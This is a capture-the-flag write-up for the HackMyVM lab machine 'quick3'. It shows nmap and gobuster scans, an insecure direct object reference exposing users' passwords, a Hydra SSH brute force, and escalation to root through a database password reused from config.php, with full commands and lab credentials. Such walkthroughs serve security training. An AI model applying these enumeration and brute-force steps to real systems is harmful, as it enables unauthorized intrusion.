# quick3

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| quick3 | eMVee | Beginner | HackMyVM |

**Summary:** The exploitation of the Quick3 machine begins with an exhaustive network reconnaissance phase to identify active services, which leads to the discovery of an Apache web server hosting a customer management application. By interacting with the registration portal, a critical Insecure Direct Object Reference vulnerability is identified within the profile management logic, allowing for the unauthorized enumeration of sensitive user data. A careful examination of the application source code reveals hidden credentials and user lists, which are subsequently leveraged to perform a successful brute force attack against the SSH service. Upon gaining initial access as the user Mike, internal enumeration of the web directory uncovers a plaintext database configuration file containing the root password. This oversight facilitates a direct transition to administrative control and the retrieval of both the user and root flags, completing the full system compromise.

---

## Reconnaissance

The initial phase of the engagement involves identifying the target machine on the local network. A simple Nmap ping sweep is conducted to locate the active host.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick3]
└─$ nmap -sn 192.168.100.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-19 23:24 WIB
Nmap scan report for 192.168.100.1 (192.168.100.1)
Host is up (0.00066s latency).
Nmap scan report for 192.168.100.2 (192.168.100.2)
Host is up (0.00041s latency).
Nmap scan report for 192.168.100.203 (192.168.100.203)
Host is up (0.0022s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 5.47 seconds
```

Once the target IP is confirmed as 192.168.100.203, a comprehensive service and version scan is performed on all ports to map the attack surface.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick3]
└─$ nmap -sCV -p- -T4 192.168.100.203
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-19 23:25 WIB
Nmap scan report for 192.168.100.203 (192.168.100.203)
Host is up (0.0040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f:cd:c7:19 (ECDSA)
|_  256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Quick Automative - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.29 seconds
```

The scan reveals SSH on port 22 and an Apache web server on port 80. To find hidden directories or files, a Gobuster directory enumeration is initiated using a medium wordlist and common file extensions.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick3]
└─$ gobuster dir -u http://192.168.100.203/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.203/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 51414]
/images               (Status: 301) [Size: 319] [--> http://192.168.100.203/images/]
/img                  (Status: 301) [Size: 316] [--> http://192.168.100.203/img/]
/modules              (Status: 301) [Size: 320] [--> http://192.168.100.203/modules/]
/css                  (Status: 301) [Size: 316] [--> http://192.168.100.203/css/]
/lib                  (Status: 301) [Size: 316] [--> http://192.168.100.203/lib/]
/js                   (Status: 301) [Size: 315] [--> http://192.168.100.203/js/]
/customer             (Status: 301) [Size: 321] [--> http://192.168.100.203/customer/]
/404.html             (Status: 200) [Size: 5013]
/fonts                (Status: 301) [Size: 318] [--> http://192.168.100.203/fonts/]
```

## Initial Access

Navigating to the `/customer/` directory reveals a web portal for users. The first step involves registering a new account to observe the application behavior.

![](image.png)

After successful registration and logging in, the user profile page is accessed. The URL structure suggests that user profiles are retrieved based on a numerical identifier.

![](image-1.png)

The profile is located at the endpoint `http://192.168.100.203/customer/user.php?id=29`. By modifying the ID parameter to 1, an Insecure Direct Object Reference vulnerability is confirmed as the profile for a different user is displayed.

![](image-2.png)

Further inspection of the page source code reveals sensitive information, specifically passwords belonging to other users.

![](image-3.png)

With this discovery, lists of potential usernames and passwords are compiled into local files for a brute force attack.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick3]
└─$ vim users.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick3]
└─$ wc -l users.txt
54 users.txt
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick3]
└─$ vim passwords.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick3]
└─$ wc -l passwords.txt
57 passwords.txt
```

Hydra is then employed to brute force the SSH service using the gathered lists. A valid set of credentials for the user Mike is successfully identified.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick3]
└─$ hydra -L users.txt -P passwords.txt ssh://192.168.100.203
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-20 00:07:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3078 login tries (l:54/p:57), ~193 tries per task
[DATA] attacking ssh://192.168.100.203:22/
[STATUS] 186.00 tries/min, 186 tries in 00:01h, 2897 to do in 00:16h, 11 active
[22][ssh] host: 192.168.100.203   login: mike   password: 6G3UCx6aH6UYvJ6m
```

## Internal Enumeration

Using the identified credentials, an SSH session is established with the target machine. Initial checks confirm the user identity and the presence of several other user directories in the home path.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick3]
└─$ ssh mike@192.168.100.203
mike@192.168.100.203's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue May 19 05:10:07 PM UTC 2026

  System load:  0.11376953125     Processes:               139
  Usage of /:   57.8% of 9.75GB   Users logged in:         0
  Memory usage: 35%               IPv4 address for enp0s3: 192.168.100.203
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

45 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jan 24 12:56:53 2024 from 10.0.2.15
mike@quick3:~$ id
uid=1002(mike) gid=1002(mike) groups=1002(mike)
mike@quick3:~$ ls -la
total 36
drwxr-x---  4 mike mike 4096 Jan 24  2024 .
drwxr-xr-x 11 root root 4096 Jan 24  2024 ..
lrwxrwxrwx  1 mike mike    9 Jan 24  2024 .bash_history -> /dev/null
-rw-r--r--  1 mike mike  220 Jan 21  2024 .bash_logout
-rw-r--r--  1 mike mike 3797 Jan 24  2024 .bashrc
drwx------  2 mike mike 4096 Jan 21  2024 .cache
drwxrwxr-x  3 mike mike 4096 Jan 21  2024 .local
-rw-r--r--  1 mike mike  807 Jan 21  2024 .profile
-rw-rw-r--  1 mike mike 4166 Jan 21  2024 user.txt
```

```bash
mike@quick3:~$ ls -la /home
total 44
drwxr-xr-x 11 root   root   4096 Jan 24  2024 .
drwxr-xr-x 20 root   root   4096 Jan 14  2024 ..
drwxr-x---  4 andrew andrew 4096 Jan 24  2024 andrew
drwxr-x---  2 coos   coos   4096 Jan 24  2024 coos
drwxr-x---  2 jeff   jeff   4096 Jan 24  2024 jeff
drwxr-x---  2 john   john   4096 Jan 24  2024 john
drwxr-x---  2 juan   juan   4096 Jan 24  2024 juan
drwxr-x---  2 lara   lara   4096 Jan 24  2024 lara
drwxr-x---  2 lee    lee    4096 Jan 24  2024 lee
drwxr-x---  4 mike   mike   4096 Jan 24  2024 mike
drwxr-x---  3 nick   nick   4096 Jan 14  2024 nick
```

A search for configuration files within the web application directory reveals a `config.php` file containing database connection details.

```bash
mike@quick3:~$ ls -la /var/www/html
total 128
drwxr-xr-x 11 www-data www-data  4096 Jan 30  2024 .
drwxr-xr-x  3 root     root      4096 Jan 21  2024 ..
-rw-r--r--  1 www-data www-data   871 Jan 21  2024 404.css
-rw-r--r--  1 www-data www-data  5013 Jan 21  2024 404.html
drwxr-xr-x  2 www-data www-data  4096 Jan 30  2024 css
drwxr-xr-x  7 www-data www-data  4096 Jan 24  2024 customer
drwxr-xr-x  2 www-data www-data  4096 Jan 30  2024 fonts
drwxr-xr-x  5 www-data www-data  4096 Jan 22  2024 images
drwxr-xr-x  2 root     root      4096 Jan 30  2024 img
-rw-r--r--  1 root     root     51414 Jan 30  2024 index.html
drwxr-xr-x  2 www-data www-data  4096 Jan 30  2024 js
drwxr-xr-x  9 root     root      4096 Jan 30  2024 lib
drwxr-xr-x  2 www-data www-data 20480 Jan 22  2024 modules
drwxr-xr-x  3 root     root      4096 Jan 30  2024 scss
-rw-r--r--  1 www-data www-data  4038 Dec  4  2023 styles.css
mike@quick3:~$ ls -la /var/www/html/customer
total 232
drwxr-xr-x  7 www-data www-data  4096 Jan 24  2024 .
drwxr-xr-x 11 www-data www-data  4096 Jan 30  2024 ..
-rw-r--r--  1 www-data www-data 19730 Jan 23  2024 cars.php
-rw-r--r--  1 www-data www-data   202 Jan 21  2024 config.php
-rw-r--r--  1 www-data www-data 35755 Jan 23  2024 contact.php
drwxr-xr-x  2 www-data www-data  4096 Jan 22  2024 css
-rw-r--r--  1 www-data www-data  9834 Jan 23  2024 dashboard.php
drwxr-xr-x  2 www-data www-data  4096 Jan 22  2024 fonts
drwxr-xr-x  5 www-data www-data  4096 Jan 22  2024 images
-rw-r--r--  1 www-data www-data  3171 Jan 22  2024 index.php
drwxr-xr-x  2 www-data www-data  4096 Jan 22  2024 js
-rw-r--r--  1 www-data www-data  4118 Jan 24  2024 login.css
-rw-r--r--  1 www-data www-data   805 Jan 21  2024 login.php
-rw-r--r--  1 www-data www-data   184 Jan 21  2024 logout.php
drwxr-xr-x  2 www-data www-data 20480 Jan 22  2024 modules
-rw-r--r--  1 www-data www-data   451 Jan 23  2024 remove.php
-rw-r--r--  1 www-data www-data   372 Jan 24  2024 script.js
-rw-r--r--  1 www-data www-data 57002 Jan 24  2024 style.css
-rw-r--r--  1 www-data www-data  1121 Jan 23  2024 submitcar.php
-rw-r--r--  1 www-data www-data  1104 Jan 24  2024 updatepassword.php
-rw-r--r--  1 www-data www-data  1213 Jan 24  2024 updateuser.php
-rw-r--r--  1 www-data www-data 19307 Jan 24  2024 user.php
mike@quick3:~$ cat /var/www/html/customer/config.php
<?php
// config.php
$conn = new mysqli('localhost', 'root', 'fastandquicktobefaster', 'quick');

// Check connection
if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
}
?>
```

## Privilege Escalation

The `config.php` file exposes the password for the root user. Attempting to switch to the root account with this password is successful, granting full administrative access to the system.

```bash
mike@quick3:~$ su - root
Password:
root@quick3:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
quick3
root@quick3:~# cat /home/mike/user.txt

                                                                                                                                 
     QQQQQQQQQ                         iiii                      kkkkkkkk                 333333333333333
   QQ:::::::::QQ                      i::::i                     k::::::k                3:::::::::::::::33
 QQ:::::::::::::QQ                     iiii                      k::::::k                3::::::33333::::::3
Q:::::::QQQ:::::::Q                                              k::::::k                3333333     3:::::3
Q::::::O   Q::::::Quuuuuu    uuuuuu  iiiiiii     cccccccccccccccc k:::::k    kkkkkkk                 3:::::3
Q:::::O     Q:::::Qu::::u    u::::u  i:::::i   cc:::::::::::::::c k:::::k   k:::::k                  3:::::3
Q:::::O     Q:::::Qu::::u    u::::u   i::::i  c:::::::::::::::::c k:::::k  k:::::k           33333333:::::3
Q:::::O     Q:::::Qu::::u    u::::u   i::::i c:::::::cccccc:::::c k:::::k k:::::k            3:::::::::::3
Q:::::O     Q:::::Qu::::u    u::::u   i::::i c::::::c     ccccccc k::::::k:::::k             33333333:::::3
Q:::::O     Q:::::Qu::::u    u::::u   i::::i c:::::c              k:::::::::::k                      3:::::3
Q:::::O  QQQQ:::::Qu::::u    u::::u   i::::i c:::::c              k:::::::::::k                      3:::::3
Q::::::O Q::::::::Qu:::::uuuu:::::u   i::::i c::::::c     ccccccc k::::::k:::::k                     3:::::3
Q:::::::QQ::::::::Qu:::::::::::::::uui::::::ic:::::::cccccc:::::ck::::::k k:::::k        3333333     3:::::3
 QQ::::::::::::::Q  u:::::::::::::::ui::::::i c:::::::::::::::::ck::::::k  k:::::k       3::::::33333::::::3
   QQ:::::::::::Q    uu::::::::uu:::ui::::::i  cc:::::::::::::::ck::::::k   k:::::k      3:::::::::::::::33
     QQQQQQQQ::::QQ    uuuuuuuu  uuuuiiiiiiii    cccccccccccccccckkkkkkkk    kkkkkkk      333333333333333
             Q:::::Q
              QQQQQQ



                                     _...----""""""""""""----..._
                                   .'       ______________       `-.
                                  :_..--"""" ___......___ """""----..
                                .' _.---"""""   (______) `"""""----. `.
                               / .'   .----.               .-----.  \  \
                              / /    /      \             /       \  \  \
                      .---.  / /    :        :           :,-"""""-.:  \  \  .---.
                     :    `\: :   __:____....J.---------.:...______:   :  :'     :
                      `"""-._ `"""_______......---------......______`""' _'.-"""'
                          / \"""""                                  """""/`.
                         / `.`.                                        .' ' `.
                        /    \ `.                                    .' .'    \
                       /      `. `-._                            _.-' .'      _:
                     :|`""----.._    `"""--------------------"""'     _..---"" |:
                     ::   /""\  _`.    _____..............______    .'_ /""\   ::
                     | `._\__/ `" `.  : 888888888P"":'.d888888P '  : '" \__/_.' |
                     |`-._  `""----'  : T888888P'|__|88888888P  :  `----"""'  _.|
                     :    `"-._     :  `.`T8P" .d88888888888P'.'  '     __.-""  |
                     :`.        `""` '   ``"""""""""""""""""     .'"""""       ,:
                     |: `-,_          \                         :       __...-':|
                     |:   '88P`Tp.    `d88888888888888888888888P    .dP`T88P   :|
                     :8p.  `8b_d88b    888888888888888888888888'   d88b_dP'   d8:
                     '8888b..___`""     `"""""""""""""""""""""'    `""___..gd888'
                      88888888  ``"""""----------------------""""'""""  88888888
                      '888888P                                    fsc   T888888P
                       `"""""

                                HMV{717[REDACTED]}
root@quick3:~# cat /root/root.txt

                                                                                                                                 
     QQQQQQQQQ                         iiii                      kkkkkkkk                 333333333333333
   QQ:::::::::QQ                      i::::i                     k::::::k                3:::::::::::::::33
 QQ:::::::::::::QQ                     iiii                      k::::::k                3::::::33333::::::3
Q:::::::QQQ:::::::Q                                              k::::::k                3333333     3:::::3
Q::::::O   Q::::::Quuuuuu    uuuuuu  iiiiiii     cccccccccccccccc k:::::k    kkkkkkk                 3:::::3
Q:::::O     Q:::::Qu::::u    u::::u  i:::::i   cc:::::::::::::::c k:::::k   k:::::k                  3:::::3
Q:::::O     Q:::::Qu::::u    u::::u   i::::i  c:::::::::::::::::c k:::::k  k:::::k           33333333:::::3
Q:::::O     Q:::::Qu::::u    u::::u   i::::i c:::::::cccccc:::::c k:::::k k:::::k            3:::::::::::3
Q:::::O     Q:::::Qu::::u    u::::u   i::::i c::::::c     ccccccc k::::::k:::::k             33333333:::::3
Q:::::O     Q:::::Qu::::u    u::::u   i::::i c:::::c              k:::::::::::k                      3:::::3
Q:::::O  QQQQ:::::Qu::::u    u::::u   i::::i c:::::c              k:::::::::::k                      3:::::3
Q::::::O Q::::::::Qu:::::uuuu:::::u   i::::i c::::::c     ccccccc k::::::k:::::k                     3:::::3
Q:::::::QQ::::::::Qu:::::::::::::::uui::::::ic:::::::cccccc:::::ck::::::k k:::::k        3333333     3:::::3
 QQ::::::::::::::Q  u:::::::::::::::ui::::::i c:::::::::::::::::ck::::::k  k:::::k       3::::::33333::::::3
   QQ:::::::::::Q    uu::::::::uu:::ui::::::i  cc:::::::::::::::ck::::::k   k:::::k      3:::::::::::::::33
     QQQQQQQQ::::QQ    uuuuuuuu  uuuuiiiiiiii    cccccccccccccccckkkkkkkk    kkkkkkk      333333333333333
             Q:::::Q
              QQQQQQ



                           __---~~~~--__                      __--~~~~---__
                          `\---~~~~~~~~\\                    //~~~~~~~~---/'
                            \/~~~~~~~~~\||                  ||/~~~~~~~~~\/
                                        `\\                //'
                                          `\\            //'
                                            ||          ||
                                  ______--~~~~~~~~~~~~~~~~~~--______
                             ___ // _-~                        ~-_ \\ ___
                            `\__)\/~                              ~\/(__/'
                             _--`-___                            ___-'--_
                           /~     `\ ~~~~~~~~------------~~~~~~~~ /'     ~\
                          /|        `\         ________         /'        |\
                         | `\   ______`\_      \------/      _/'______   /' |
                         |   `\_~-_____\ ~-________________-~ /_____-~_/'   |
                         `.     ~-__________________________________-~     .'
                          `.      [_______/------|~~|------\_______]      .'
                           `\--___((____)(________\/________)(____))___--/'
                            |>>>>>>||                            ||<<<<<<|
                            `\<<<<</'                            `\>>>>>/'


                                HMV{f17[REDACTED]}
```

---

## Attack Chain Summary
1. Reconnaissance: Scanning the network to identify the target IP and enumerating open ports and services using Nmap and Gobuster.
2. Vulnerability Discovery: Identifying an Insecure Direct Object Reference flaw in the user profile management section of the web application.
3. Exploitation: Extracting credentials from the application source code and performing a successful SSH brute force attack against the user Mike.
4. Internal Enumeration: Investigating the file system and locating a plaintext password for the root user within the web application configuration files.
5. Privilege Escalation: Leveraging the discovered administrative password to gain full root access and capture the system flags.

